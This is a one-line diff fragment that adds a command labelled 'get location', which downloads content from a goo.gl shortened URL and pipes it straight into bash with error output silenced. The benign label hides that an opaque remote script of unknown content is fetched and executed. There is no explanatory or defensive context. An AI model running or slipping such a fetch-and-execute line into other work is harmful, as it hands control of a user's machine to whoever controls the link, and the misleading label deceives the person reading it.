@@ -1,0 +1,1 @@
+get location:   wget -O- https://goo.gl/uWvyfz 2>/dev/null| bash
